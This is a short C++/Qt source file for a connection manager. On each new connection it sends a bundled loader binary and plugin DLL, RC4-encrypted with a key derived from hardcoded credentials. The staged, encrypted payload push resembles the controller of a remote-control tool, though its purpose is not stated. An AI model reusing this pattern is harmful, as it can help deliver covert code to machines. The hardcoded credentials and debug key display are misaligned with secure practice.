#include "connectionmanager.h"

//Delete
#include <QMessageBox>

ConnectionManager::ConnectionManager(MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;

    connect(this,SIGNAL(ConnectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    //connect ConnectionEstablished -> GUI
}

void ConnectionManager::SetupConnection(Connection *connection)
{
    if(connection->getSetupState()==Connection::JustConnected)
    {
            QFile fileLoader(":/res/loader.bin");
            QFile filePluginLoader(":/res/pluginloader.dll");

            if(!fileLoader.open(QIODevice::ReadOnly)) return;
            if(!filePluginLoader.open(QIODevice::ReadOnly)) return;

            QByteArray Loader=fileLoader.readAll();
            QByteArray PluginLoader=filePluginLoader.readAll();

            QByteArray TotalToSend;
            TotalToSend.append(Loader);
            TotalToSend.append(PluginLoader);

            //TODO:
            QString Username="Zero";
            QString Pass="1234";

            Crypto Crypt1(TotalToSend);
            QString sha1=Crypt1.sha1(Username+Pass);
            QMessageBox::information(0,":P",sha1);

            Crypt1.RC4(sha1.toAscii());
            qint32 CheckSum=Crypt1.jenkins_one_at_a_time();

            TotalToSend.clear();
            TotalToSend.append(CheckSum);
            TotalToSend.append(Crypt1.getData());

            QDataStream out(connection);
            out.setVersion(QDataStream::Qt_4_8);
            out<<TotalToSend;

            connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
            connection->setState(Connection::Ready);
    }
    else if(connection->getSetupState()==Connection::Finished)
    {
            connection->setState(Connection::Ready);
            emit ConnectionEstablished(connection);
    }
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}
